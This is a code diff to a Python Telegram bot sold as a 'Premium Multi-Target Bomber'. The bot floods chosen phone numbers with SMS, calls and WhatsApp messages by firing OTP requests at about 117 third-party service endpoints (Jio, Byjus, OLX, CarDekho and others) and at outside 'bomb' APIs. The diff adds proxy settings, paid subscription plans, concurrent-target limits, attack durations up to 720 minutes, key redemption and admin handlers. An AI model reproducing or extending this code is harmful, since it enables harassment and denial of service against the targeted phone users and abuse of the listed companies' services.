@@ -141,6 +141,10 @@ WEBHOOK_URL = os.environ.get("WEBHOOK_URL", "")
 USE_WEBHOOK = os.environ.get("USE_WEBHOOK", "false").lower() == "true"
 DB_PATH = os.environ.get("DB_PATH", os.path.join(os.path.dirname(os.path.abspath(__file__)), "rolexbomber.db"))
 
+# ========== PROXY SUPPORT (DISABLED BY DEFAULT) ==========
+PROXY_URL = os.environ.get("PROXY_URL", "")
+USE_PROXY = os.environ.get("USE_PROXY", "false").lower() == "true"
+
 PLANS = {
     "standard": {"name": "Standard", "price": 149, "days": 30, "concurrent": 2, "max_duration": 300},
     "premium": {"name": "Premium", "price": 249, "days": 30, "concurrent": 5, "max_duration": 720},
@@ -397,7 +401,7 @@ class SqliteStorage:
 
 db = None
 
-# ========== COMPLETE API LIST ==========
+# ========== COMPLETE API LIST (117 APIs) ==========
 def build_api_list():
     apis = []
     
@@ -1990,21 +1994,7 @@ def build_api_list():
         "body": {}
     })
     
-    # ====== 100. Holidayify ======
-    apis.append({
-        "name": "Holidify",
-        "url": "https://www.holidify.com/rest/package/submitCallme.hdfy",
-        "method": "POST",
-        "headers": {
-            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
-            "Accept": "*/*",
-            "X-Requested-With": "XMLHttpRequest",
-            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36"
-        },
-        "body": "name=Adesh+Dubey&emailId=&contact={no}&country=88&internalPlaceCode=SINGAPORE&leadData=Destination.Packages_callMe_Packages_callMe_timeout_null&destCountryCode=SINGAPORE&countryPhoneCode=%2B91&platform=Linux+armv81&pageUrl=https%3A%2F%2Fwww.holidify.com%2Fplaces%2Fsingapore%2Fpackages.html%3Futm_source%3Dgoogle%26utm_medium%3Dpmax%26utm_campaign%3Dsingapore_pmax%26gad_source%3D1%26gad_campaignid%3D22725252908%26gbraid%3D0AAAAADLSud5aKXKVA0SLBfyeMwzh-26x4%26gclid%3DCjwKCAjwhNbTBhB4EiwAsFSg-ujhXN2fE1UAkJu948NZbf1V-KUlrFaPr828QQdKS4xxMk_MMZqB1RoCCEAQAvD_BwE&placeName=Singapore&referrer=https%3A%2F%2Fwww.google.com%2F&utmSource=google&utmMedium=pmax&utmCampaign=singapore_pmax&tourPackageIds=&quoteId=0&agentId=0&otpRequired=1&activeTourPackage=0"}
-    })
-    
-    # ====== 101. Jio ======
+    # ====== 100. Jio ======
     apis.append({
         "name": "Jio",
         "url": "https://www.jio.com/api/jio-login-service/login/sendOtp",
@@ -2016,7 +2006,7 @@ def build_api_list():
         "body": {"mobileNumber": "{no}", "loginFlowType": "MOBILE", "alternateNumber": ""}
     })
     
-    # ====== 102. KPN WhatsApp ======
+    # ====== 101. KPN WhatsApp ======
     apis.append({
         "name": "KPN_WhatsApp",
         "url": "https://api.kpnfresh.com/s/authn/api/v1/otp-generate",
@@ -2030,7 +2020,7 @@ def build_api_list():
         "body": {"notification_channel": "WHATSAPP", "phone_number": {"country_code": "+91", "number": "{no}"}}
     })
     
-    # ====== 103. Wakefit SMS ======
+    # ====== 102. Wakefit SMS ======
     apis.append({
         "name": "Wakefit_SMS",
         "url": "https://api.wakefit.co/api/consumer-sms-otp/",
@@ -2042,7 +2032,7 @@ def build_api_list():
         "body": {"mobile": "{no}"}
     })
     
-    # ====== 104. Byjus SMS ======
+    # ====== 103. Byjus SMS ======
     apis.append({
         "name": "Byjus_SMS",
         "url": "https://api.byjus.com/v2/otp/send",
@@ -2054,7 +2044,7 @@ def build_api_list():
         "body": {"phone": "{no}"}
     })
     
-    # ====== 105. Hungama OTP ======
+    # ====== 104. Hungama OTP ======
     apis.append({
         "name": "Hungama_OTP",
         "url": "https://communication.api.hungama.com/v1/communication/otp",
@@ -2066,7 +2056,7 @@ def build_api_list():
         "body": {"mobileNo": "{no}", "countryCode": "+91", "appCode": "un", "messageId": "1", "device": "web"}
     })
     
-    # ====== 106. Meru Cab ======
+    # ====== 105. Meru Cab ======
     apis.append({
         "name": "MeruCab",
         "url": "https://merucabapp.com/api/otp/generate",
@@ -2078,7 +2068,7 @@ def build_api_list():
         "body": "mobile_number={no}"
     })
     
-    # ====== 107. ShipRocket ======
+    # ====== 106. ShipRocket ======
     apis.append({
         "name": "ShipRocket",
         "url": "https://sr-wave-api.shiprocket.in/v1/customer/auth/otp/send",
@@ -2090,7 +2080,7 @@ def build_api_list():
         "body": {"mobileNumber": "{no}"}
     })
     
-    # ====== 108. GoKwik V3 ======
+    # ====== 107. GoKwik V3 ======
     apis.append({
         "name": "GoKwik_V3",
         "url": "https://gkx.gokwik.co/v3/gkstrict/auth/otp/send",
@@ -2102,7 +2092,7 @@ def build_api_list():
         "body": {"phone": "{no}", "country": "in"}
     })
     
-    # ====== 109. Droom ======
+    # ====== 108. Droom ======
     apis.append({
         "name": "Droom",
         "url": "https://api.droom.in/v2/user/send-otp",
@@ -2114,7 +2104,7 @@ def build_api_list():
         "body": {"mobile": "{no}"}
     })
     
-    # ====== 110. CarDekho ======
+    # ====== 109. CarDekho ======
     apis.append({
         "name": "CarDekho",
         "url": "https://api.cardekho.com/v1/user/send-otp",
@@ -2126,7 +2116,7 @@ def build_api_list():
         "body": {"mobile": "{no}"}
     })
     
-    # ====== 111. Gaadi ======
+    # ====== 110. Gaadi ======
     apis.append({
         "name": "Gaadi",
         "url": "https://api.gaadi.com/v1/user/send-otp",
@@ -2138,7 +2128,7 @@ def build_api_list():
         "body": {"mobile": "{no}"}
     })
     
-    # ====== 112. BikeDekho ======
+    # ====== 111. BikeDekho ======
     apis.append({
         "name": "BikeDekho",
         "url": "https://api.bikedekho.com/v1/user/send-otp",
@@ -2150,7 +2140,7 @@ def build_api_list():
         "body": {"mobile": "{no}"}
     })
     
-    # ====== 113. OLX SMS ======
+    # ====== 112. OLX SMS ======
     apis.append({
         "name": "OLX_SMS",
         "url": "https://www.olx.in/api/auth/authenticate",
@@ -2166,7 +2156,7 @@ def build_api_list():
         "body": {"method": "sms", "phone": "{no}", "language": "en-IN", "grantType": "retry"}
     })
     
-    # ====== 114. RK Niloy Call API ======
+    # ====== 113. RK Niloy Call API ======
     apis.append({
         "name": "RK_Niloy_Call",
         "url": "https://rk-niloy-call-api-sigma.vercel.app/api",
@@ -2179,7 +2169,7 @@ def build_api_list():
         "body": {}
     })
     
-    # ====== 115. RK Niloy Bomb API ======
+    # ====== 114. RK Niloy Bomb API ======
     apis.append({
         "name": "RK_Niloy_Bomb",
         "url": "https://rkniloycall.vercel.app/bomb/{no}",
@@ -2191,7 +2181,7 @@ def build_api_list():
         "body": {}
     })
     
-    # ====== 116. OTP Bomber API ======
+    # ====== 115. OTP Bomber API ======
     apis.append({
         "name": "OTP_Bomber_API",
         "url": "https://otp-bomber-api.vercel.app/api",
@@ -2204,7 +2194,7 @@ def build_api_list():
         "body": {}
     })
     
-    # ====== 117. BomberQ API ======
+    # ====== 116. BomberQ API ======
     apis.append({
         "name": "BomberQ_API",
         "url": "https://bomberqapis.vercel.app/bomb",
@@ -2217,7 +2207,7 @@ def build_api_list():
         "body": {}
     })
     
-    # ====== 118. IGP Earning API ======
+    # ====== 117. IGP Earning API ======
     apis.append({
         "name": "IGP_Earning",
         "url": "https://earning-igp.unaux.com//codes/89EzVmsnYb.php",
@@ -2276,7 +2266,7 @@ class AttackManager:
         
         self._session = None
         self._connector = None
-        self._proxy = None  # Proxy disabled by default
+        self._proxy = None
 
     async def _get_session(self):
         if self._session is None or self._session.closed:
@@ -2288,7 +2278,6 @@ class AttackManager:
                 'enable_cleanup_closed': True,
                 'force_close': False
             }
-            
             self._connector = aiohttp.TCPConnector(**connector_kwargs)
             timeout = aiohttp.ClientTimeout(total=15, connect=5, sock_read=10)
             self._session = aiohttp.ClientSession(
@@ -2519,10 +2508,47 @@ class AttackManager:
         return working_apis, failed_apis
 
 # ========== TELEGRAM BOT HANDLERS ==========
-# [All your original handlers go here - start, mix, status, account, plan, redeem, protect, unprotect, help, etc.]
-# I'm keeping the original structure intact
+async def check_channel_join(update, context):
+    uid = update.effective_user.id
+    if uid == OWNER_ID:
+        return True
+    channel = await manager.db.get_channel()
+    if not channel:
+        return True
 
-# ========== MAIN FUNCTION ==========
+    channel_clean = channel.strip()
+    if channel_clean.startswith("https://"):
+        channel_clean = channel_clean.replace("https://", "", 1)
+    if channel_clean.startswith("http://"):
+        channel_clean = channel_clean.replace("http://", "", 1)
+    if channel_clean.startswith("t.me/"):
+        channel_clean = channel_clean.replace("t.me/", "", 1)
+    channel_clean = channel_clean.lstrip("@").split("?")[0].split("/")[0].strip()
+    if not channel_clean:
+        return True
+
+    try:
+        member = await context.bot.get_chat_member(channel_clean, uid)
+        if member.status in ("member", "administrator", "creator"):
+            return True
+    except Exception:
+        pass
+
+    kb = InlineKeyboardMarkup([[InlineKeyboardButton("📢 JOIN CHANNEL", url=f"https://t.me/{channel_clean}")]])
+    msg = (f"⛔ ACCESS DENIED!\n\n"
+           f"❌ Aapko hamara channel join karna hoga bot use karne ke liye:\n\n"
+           f"👉 t.me/{channel_clean}\n\n"
+           f"✅ Channel join karne ke baad /start dobara dabayein.")
+    try:
+        if update.callback_query:
+            await update.callback_query.answer()
+            await update.callback_query.message.reply_text(msg, reply_markup=kb)
+        else:
+            await update.message.reply_text(msg, reply_markup=kb)
+    except Exception:
+        pass
+    return False
+
 async def web_server():
     from aiohttp import web
     async def handle(request):
@@ -2535,6 +2561,411 @@ async def web_server():
     site = web.TCPSite(runner, '0.0.0.0', PORT)
     await site.start()
     logger.info(f"🌐 Web Server running on port {PORT}")
+
+def main_kb(user_id):
+    kb = [
+        [KeyboardButton("🚀 /mix"), KeyboardButton("📊 /status")],
+        [KeyboardButton("👤 /account"), KeyboardButton("💳 /plan")],
+        [KeyboardButton("🛡 /protect"), KeyboardButton("🔓 /unprotect")],
+        [KeyboardButton("🔑 /redeem"), KeyboardButton("❓ /help")]
+    ]
+    if user_id == OWNER_ID:
+        kb.append([KeyboardButton("👑 Admin")])
+    return ReplyKeyboardMarkup(kb, resize_keyboard=True)
+
+async def multi_target_kb(user_id):
+    max_targets = await manager.db.get_concurrent_limit(user_id)
+    buttons = []
+    for i in range(1, min(max_targets, 10) + 1):
+        buttons.append([InlineKeyboardButton(f"🎯 {i} Target(s)", callback_data=f"targets_{i}")])
+    buttons.append([InlineKeyboardButton("❌ Cancel", callback_data="cancel_attack")])
+    return InlineKeyboardMarkup(buttons)
+
+async def duration_kb(user_id):
+    max_dur = await manager.db.get_max_duration(user_id)
+    con = await manager.db.get_concurrent_limit(user_id)
+    buttons = []
+    row = []
+    durations = [1, 5, 15, 30, 60, 120, 180, 240, 300, 360, 480, 600, 720]
+    for minutes in durations:
+        if minutes <= max_dur:
+            if minutes < 60:
+                label = f"{minutes}min"
+            elif minutes == 60:
+                label = "1h"
+            else:
+                label = f"{minutes//60}h"
+            row.append(InlineKeyboardButton(label, callback_data=f"dur_{minutes}"))
+            if len(row) == 3:
+                buttons.append(row)
+                row = []
+    if row:
+        buttons.append(row)
+    buttons.append([InlineKeyboardButton(f"⚡ {con}x Concurrent per target", callback_data="info")])
+    buttons.append([InlineKeyboardButton("❌ Cancel", callback_data="cancel_attack")])
+    return InlineKeyboardMarkup(buttons)
+
+async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    uid = update.effective_user.id
+    if not await check_channel_join(update, context):
+        return
+    await manager.db.add_user(uid)
+    await update.message.reply_photo(WELCOME_IMAGE, caption=f"🔥 Welcome to Premium Multi-Target Bomber!\n\n📡 Total APIs: {len(APIS)}\n🎯 SMS + Call + WhatsApp\n\nUse /help for commands.", reply_markup=main_kb(uid))
+
+async def mix_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    uid = update.effective_user.id
+    if not await check_channel_join(update, context):
+        return
+    if not await manager.db.is_premium(uid):
+        await update.message.reply_text("⛔ Premium Required!\nUse /plan to buy or /redeem to activate.")
+        return
+    if uid in manager.active_attacks:
+        await update.message.reply_text("⚠️ You already have an active attack!\nUse /status to check.")
+        return
+    
+    max_targets = await manager.db.get_concurrent_limit(uid)
+    await update.message.reply_text(f"📞 Select number of targets to attack (Max: {max_targets}):", reply_markup=await multi_target_kb(uid))
+    context.user_data['waiting_for_target_count'] = True
+
+async def status_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    uid = update.effective_user.id
+    if not await check_channel_join(update, context):
+        return
+    if uid in manager.active_attacks:
+        info = manager.active_attacks[uid]
+        left = int((info['end_time'] - time.time()) / 60)
+        targets = ", ".join(info['targets'])
+        await update.message.reply_text(f"🔥 MULTI-TARGET ATTACK RUNNING\n🎯 Targets: {targets}\n📊 Count: {len(info['targets'])}\n⏳ Left: {left} min", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🛑 STOP ALL", callback_data="stop")]]))
+    else:
+        await update.message.reply_text("💤 No active attacks.")
+
+async def account_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    uid = update.effective_user.id
+    if not await check_channel_join(update, context):
+        return
+    plan = await manager.db.get_plan_name(uid)
+    expiry = await manager.db.get_expiry(uid)
+    con = await manager.db.get_concurrent_limit(uid)
+    max_dur = await manager.db.get_max_duration(uid)
+    await update.message.reply_text(f"👤 ACCOUNT\n🆔 {uid}\n📋 Plan: {plan}\n📅 Expiry: {expiry}\n⚡ Concurrent Targets: {con}\n⏰ Max Duration: {max_dur}min")
+
+async def plan_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    if not await check_channel_join(update, context):
+        return
+    msg = "💳 AVAILABLE SUBSCRIPTION PLANS\n\n"
+    for key, p in PLANS.items():
+        msg += f"🔹 {p['name']} Plan (₹{p['price']})\n"
+        msg += f"   - Duration: {p['days']} Days\n"
+        msg += f"   - Concurrent Targets: {p['concurrent']}\n"
+        msg += f"   - Max Task Duration: {p['max_duration']} minutes\n\n"
+    msg += "💡 Use /redeem if you have a code.\n💬 Contact @RolexBot00 for purchase."
+    kb = InlineKeyboardMarkup([[InlineKeyboardButton("👤 Contact Admin", url=f"tg://user?id={OWNER_ID}")]])
+    await update.message.reply_text(msg, reply_markup=kb)
+
+async def redeem_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    if not await check_channel_join(update, context):
+        return
+    await update.message.reply_text("🔑 Send your premium code:\nFormat: PREMIUM-XXXXXXXX")
+    context.user_data['waiting_for_redeem'] = True
+
+async def protect_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    uid = update.effective_user.id
+    if not await check_channel_join(update, context):
+        return
+    if not await manager.db.is_premium(uid):
+        await update.message.reply_text("⛔ Premium required!")
+        return
+    await update.message.reply_text("🛡 Send 10-digit number to protect:")
+    context.user_data['waiting_for_protect'] = True
+
+async def unprotect_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    uid = update.effective_user.id
+    if not await check_channel_join(update, context):
+        return
+    await manager.db.unprotect(uid)
+    await update.message.reply_text("🔓 Number unprotected.")
+
+async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    if not await check_channel_join(update, context):
+        return
+    msg = f"""ℹ️ USER HELP & INSTRUCTIONS
+
+🚀 CORE COMMANDS
+• /start: Main menu with quick-access buttons
+• /mix: Start multi-target attack on numbers
+• /status: See live progress of your attacks
+
+👤 ACCOUNT & SUBSCRIPTION
+• /account: Shows your current plan and time left
+• /plan: Displays all available subscription plans
+• /redeem: Activate your subscription with a code
+
+🛡️ NUMBER PROTECTION
+• /protect & /unprotect: Manage number protection
+
+💡 FEATURES:
+• SMS + Call + WhatsApp Bombing
+• Standard: 2 targets/300min
+• Premium: 5 targets/720min  
+• Ultimate: 10 targets/720min
+• Total APIs Loaded: {len(APIS)}
+
+💡 Tip: Use the buttons below for quick access!"""
+    await update.message.reply_text(msg, reply_markup=main_kb(update.effective_user.id))
+
+async def show_admin_panel(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    kb = InlineKeyboardMarkup([
+        [InlineKeyboardButton("🔑 Generate Standard Key (30 days)", callback_data="adm_gen_standard")],
+        [InlineKeyboardButton("⭐ Generate Premium Key (30 days)", callback_data="adm_gen_premium")],
+        [InlineKeyboardButton("👑 Generate Ultimate Key (30 days)", callback_data="adm_gen_ultimate")],
+        [InlineKeyboardButton("🔧 Custom Key (Days & Plan)", callback_data="adm_custom_key")],
+        [InlineKeyboardButton("📢 Broadcast Message", callback_data="adm_broadcast")],
+        [InlineKeyboardButton("📊 View Statistics", callback_data="adm_stats")],
+        [InlineKeyboardButton("📣 Set Channel (Force Join)", callback_data="adm_set_channel")],
+        [InlineKeyboardButton("🗑 Remove Channel", callback_data="adm_remove_channel")],
+        [InlineKeyboardButton("🔍 Check Working APIs", callback_data="adm_check_apis")]
+    ])
+    await update.message.reply_text("👑 Admin Control Panel:\nSelect an option:", reply_markup=kb)
+
+async def generate_key_logic(update: Update, context: ContextTypes.DEFAULT_TYPE, text):
+    uid = update.effective_user.id
+    if uid != OWNER_ID:
+        return
+    context.user_data['waiting_for_genkey'] = False
+    try:
+        parts = text.split()
+        days = int(parts[0])
+        plan = parts[1].lower() if len(parts) > 1 else "standard"
+        if plan not in PLANS:
+            plan = "standard"
+        code = await manager.db.generate_code(days, plan)
+        await update.message.reply_text(f"✅ KEY GENERATED SUCCESSFULLY!\n\n🔑 Code: `{code}`\n📅 Days: {days}\n📋 Plan: {plan.upper()}\n\nSend this code to user for premium activation.", parse_mode="Markdown")
+    except:
+        await update.message.reply_text("❌ Invalid format!\nUse: `days plan_type`\nExample: `30 premium`\n\nAvailable plans: standard, premium, ultimate", parse_mode="Markdown")
+
+async def broadcast_logic(update: Update, context: ContextTypes.DEFAULT_TYPE, text):
+    uid = update.effective_user.id
+    if uid != OWNER_ID:
+        return
+    context.user_data['waiting_for_broadcast'] = False
+    users = await manager.db.get_all_users()
+    success, failed = 0, 0
+    msg = await update.message.reply_text(f"📢 Broadcasting to {len(users)} users...")
+    for uid_user in users:
+        try:
+            await context.bot.send_message(uid_user, f"📢 ANNOUNCEMENT\n\n{text}")
+            success += 1
+        except Exception:
+            failed += 1
+            await asyncio.sleep(0.1)
+    await msg.edit_text(
+        f"✅ BROADCAST COMPLETED\n✅ Success: {success}\n❌ Failed: {failed}"
+    )
+
+async def process_numbers(update: Update, context: ContextTypes.DEFAULT_TYPE, text):
+    uid = update.effective_user.id
+    numbers = [num.strip() for num in text.replace(',', ' ').split() if num.strip().isdigit() and len(num.strip()) == 10]
+    target_count = context.user_data.get('expected_targets', 0)
+    
+    if len(numbers) != target_count:
+        await update.message.reply_text(f"❌ Please send exactly {target_count} phone numbers.\nExample: {' '.join(['9876543210'] * target_count)}")
+        return
+    
+    context.user_data['waiting_for_numbers'] = False
+    context.user_data['target_numbers'] = numbers
+    manager.db.set_attack_data(uid, numbers)
+    max_dur = await manager.db.get_max_duration(uid)
+    await update.message.reply_text(f"📞 Targets: {', '.join(numbers)}\n⏰ Select duration (Max: {max_dur}min):", reply_markup=await duration_kb(uid))
+
+async def handle_msg(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    uid = update.effective_user.id
+    if not await check_channel_join(update, context):
+        return
+    text = update.message.text
+    
+    if uid == OWNER_ID and context.user_data.get('waiting_for_genkey'):
+        await generate_key_logic(update, context, text)
+        return
+    
+    if uid == OWNER_ID and context.user_data.get('waiting_for_broadcast'):
+        await broadcast_logic(update, context, text)
+        return
+    
+    if uid == OWNER_ID and context.user_data.get('waiting_for_channel'):
+        context.user_data['waiting_for_channel'] = False
+        channel = text.strip().strip('@')
+        if 't.me/' in channel:
+            channel = channel.split('t.me/')[-1]
+        channel = channel.split('?')[0].split('/')[0].strip()
+        if not channel:
+            await update.message.reply_text("❌ Invalid channel! Send like: @yourchannel ya https://t.me/yourchannel")
+            return
+        await manager.db.set_channel(channel)
+        await update.message.reply_text(f"✅ Channel SET!\n\n📣 Users must join: @{channel}\n\nAb bot use karne ke liye sabko ye channel join karna hoga. 🔒")
+        return
+    
+    await manager.db.add_user(uid)
+    if not await check_channel_join(update, context):
+        return
+    
+    if text == "🚀 /mix" or text == "/mix":
+        await mix_command(update, context)
+    elif text == "📊 /status" or text == "/status":
+        await status_command(update, context)
+    elif text == "👤 /account" or text == "/account":
+        await account_command(update, context)
+    elif text == "💳 /plan" or text == "/plan":
+        await plan_command(update, context)
+    elif text == "🔑 /redeem" or text == "/redeem":
+        await redeem_command(update, context)
+    elif text == "🛡 /protect" or text == "/protect":
+        await protect_command(update, context)
+    elif text == "🔓 /unprotect" or text == "/unprotect":
+        await unprotect_command(update, context)
+    elif text == "❓ /help" or text == "/help":
+        await help_command(update, context)
+    elif text == "👑 Admin" and uid == OWNER_ID:
+        await show_admin_panel(update, context)
+    elif context.user_data.get('waiting_for_target_count'):
+        pass
+    elif context.user_data.get('waiting_for_numbers') and text.strip():
+        await process_numbers(update, context, text)
+    elif context.user_data.get('waiting_for_redeem'):
+        context.user_data['waiting_for_redeem'] = False
+        success, days, plan, exp = await manager.db.redeem(uid, text.strip().upper())
+        if success:
+            await update.message.reply_text(f"✅ Premium Activated!\n📋 Plan: {plan.upper()}\n📅 Expiry: {exp}")
+        else:
+            await update.message.reply_text("❌ Invalid or already used code.")
+    elif context.user_data.get('waiting_for_protect') and text.isdigit() and len(text) == 10:
+        context.user_data['waiting_for_protect'] = False
+        await manager.db.protect(uid, text)
+        await update.message.reply_text(f"🛡 Protected: {text}")
+    elif text == "/cancel":
+        for k in ['waiting_for_target_count', 'waiting_for_numbers', 'waiting_for_redeem', 'waiting_for_protect', 'waiting_for_genkey', 'waiting_for_broadcast', 'expected_targets']:
+            context.user_data.pop(k, None)
+        manager.db.clear_attack_data(uid)
+        await update.message.reply_text("❌ Cancelled.", reply_markup=main_kb(uid))
+
+async def btn_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    query = update.callback_query
+    await query.answer()
+    uid = query.from_user.id
+    if not await check_channel_join(update, context):
+        return
+    data = query.data
+    
+    if data == "adm_gen_standard" and uid == OWNER_ID:
+        code = await manager.db.generate_code(30, "standard")
+        await query.message.reply_text(f"✅ STANDARD KEY GENERATED!\n\n🔑 Code: `{code}`\n📅 Days: 30\n📋 Plan: STANDARD\n\nSend this code to user.", parse_mode="Markdown")
+    
+    elif data == "adm_gen_premium" and uid == OWNER_ID:
+        code = await manager.db.generate_code(30, "premium")
+        await query.message.reply_text(f"✅ PREMIUM KEY GENERATED!\n\n🔑 Code: `{code}`\n📅 Days: 30\n📋 Plan: PREMIUM\n\nSend this code to user.", parse_mode="Markdown")
+    
+    elif data == "adm_gen_ultimate" and uid == OWNER_ID:
+        code = await manager.db.generate_code(30, "ultimate")
+        await query.message.reply_text(f"✅ ULTIMATE KEY GENERATED!\n\n🔑 Code: `{code}`\n📅 Days: 30\n📋 Plan: ULTIMATE\n\nSend this code to user.", parse_mode="Markdown")
+    
+    elif data == "adm_custom_key" and uid == OWNER_ID:
+        context.user_data['waiting_for_genkey'] = True
+        await query.message.reply_text("🔑 Send custom key details:\nFormat: `days plan_type`\nExample: `30 standard`\n\nAvailable plans: standard, premium, ultimate", parse_mode="Markdown")
+    
+    elif data.startswith("targets_"):
+        count = int(data.split("_")[1])
+        context.user_data['waiting_for_target_count'] = False
+        context.user_data['waiting_for_numbers'] = True
+        context.user_data['expected_targets'] = count
+        await query.edit_message_text(f"📞 Send {count} phone number(s) separated by space or new line:\nExample: {' '.join(['9876543210'] * count)}")
+    
+    elif data.startswith("dur_"):
+        targets = manager.db.get_attack_data(uid)
+        if not targets:
+            await query.edit_message_text("❌ Session expired. Use /mix again.")
+            return
+        duration = int(data.split("_")[1])
+        success, msg = await manager.start_attack(uid, targets, duration)
+        if success:
+            await query.edit_message_text(f"🚀 MULTI-TARGET ATTACK STARTED!\n🎯 Targets: {', '.join(targets)}\n📊 Count: {len(targets)}\n{msg}")
+        else:
+            await query.edit_message_text(f"❌ {msg}")
+        manager.db.clear_attack_data(uid)
+    
+    elif data == "cancel_attack":
+        manager.db.clear_attack_data(uid)
+        for k in ['waiting_for_target_count', 'waiting_for_numbers', 'expected_targets']:
+            context.user_data.pop(k, None)
+        await query.edit_message_text("❌ Cancelled.")
+    
+    elif data == "stop":
+        if await manager.stop_attack(uid):
+            await query.edit_message_text("🛑 All attacks stopped.")
+        else:
+            await query.answer("No active attack.")
+    
+    elif data == "adm_broadcast" and uid == OWNER_ID:
+        context.user_data['waiting_for_broadcast'] = True
+        await query.message.reply_text("📢 Send your broadcast message to all users:")
+    
+    elif data == "adm_stats" and uid == OWNER_ID:
+        u, p, c = await manager.db.get_stats()
+        await query.message.reply_text(f"📊 BOT STATISTICS\n\n👥 Total Users: {u}\n⭐ Premium Users: {p}\n🔑 Generated Codes: {c}\n💎 Owner ID: {OWNER_ID}")
+    
+    elif data == "adm_set_channel" and uid == OWNER_ID:
+        context.user_data['waiting_for_channel'] = True
+        await query.message.reply_text("📣 Send your channel username or link:\n\nExamples:\n• @yourchannel\n• https://t.me/yourchannel\n\nSend the channel you want users to join before using the bot.")
+    
+    elif data == "adm_remove_channel" and uid == OWNER_ID:
+        await manager.db.remove_channel()
+        await query.message.reply_text("🗑 Channel removed! Bot is now open for everyone.")
+    
+    elif data == "adm_check_apis" and uid == OWNER_ID:
+        status_msg = await query.message.reply_text("🔍 Checking all APIs... Please wait.\n\n⏳ This may take 1-2 minutes...")
+        
+        try:
+            working, failed = await manager.check_working_apis()
+            
+            total = len(APIS)
+            working_count = len(working)
+            failed_count = len(failed)
+            
+            result_msg = f"📊 WORKING APIs STATUS\n\n"
+            result_msg += f"✅ Total APIs Tested: {total}\n"
+            result_msg += f"✅ Working APIs: {working_count}\n"
+            result_msg += f"❌ Failed APIs: {failed_count}\n\n"
+            
+            if working:
+                result_msg += "✅ WORKING APIs LIST:\n"
+                for i, name in enumerate(working, 1):
+                    result_msg += f"{i}. {name}\n"
+                    if i >= 30:
+                        result_msg += f"... and {len(working) - 30} more\n"
+                        break
+            
+            if failed:
+                result_msg += "\n❌ FAILED APIs (Sample):\n"
+                for i, name in enumerate(failed[:10], 1):
+                    result_msg += f"{i}. {name}\n"
+                if len(failed) > 10:
+                    result_msg += f"... and {len(failed) - 10} more\n"
+            
+            await status_msg.edit_text(result_msg)
+            
+        except Exception as e:
+            await status_msg.edit_text(f"❌ Error checking APIs: {str(e)}")
+    
+    elif data == "info":
+        con = await manager.db.get_concurrent_limit(uid)
+        await query.answer(f"⚡ {con}x Concurrent Workers Per Target\n📡 Total APIs: {len(APIS)}", show_alert=True)
+
+async def cancel_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    uid = update.effective_user.id
+    if not await check_channel_join(update, context):
+        return
+    for k in ['waiting_for_target_count', 'waiting_for_numbers', 'waiting_for_redeem', 'waiting_for_protect', 'waiting_for_genkey', 'waiting_for_broadcast', 'expected_targets']:
+        context.user_data.pop(k, None)
+    manager.db.clear_attack_data(uid)
+    await update.message.reply_text("❌ Cancelled.", reply_markup=main_kb(uid))
 
 async def shutdown_handler(signal, loop):
     logger.info(f"Received exit signal {signal.name}...")
@@ -2574,9 +3005,18 @@ def main():
            .pool_timeout(30)
            .build())
     
-    # ====== ADD ALL YOUR ORIGINAL HANDLERS HERE ======
-    # (Your complete start, mix, status, account, plan, redeem, protect, unprotect, help, 
-    #  btn_handler, handle_msg, admin panel, etc.)
+    app.add_handler(CommandHandler("start", start))
+    app.add_handler(CommandHandler("mix", mix_command))
+    app.add_handler(CommandHandler("status", status_command))
+    app.add_handler(CommandHandler("account", account_command))
+    app.add_handler(CommandHandler("plan", plan_command))
+    app.add_handler(CommandHandler("redeem", redeem_command))
+    app.add_handler(CommandHandler("protect", protect_command))
+    app.add_handler(CommandHandler("unprotect", unprotect_command))
+    app.add_handler(CommandHandler("help", help_command))
+    app.add_handler(CommandHandler("cancel", cancel_command))
+    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_msg))
+    app.add_handler(CallbackQueryHandler(btn_handler))
     
     logger.info("=" * 60)
     logger.info(f"🔥 PREMIUM MULTI-TARGET BOMBER Started")
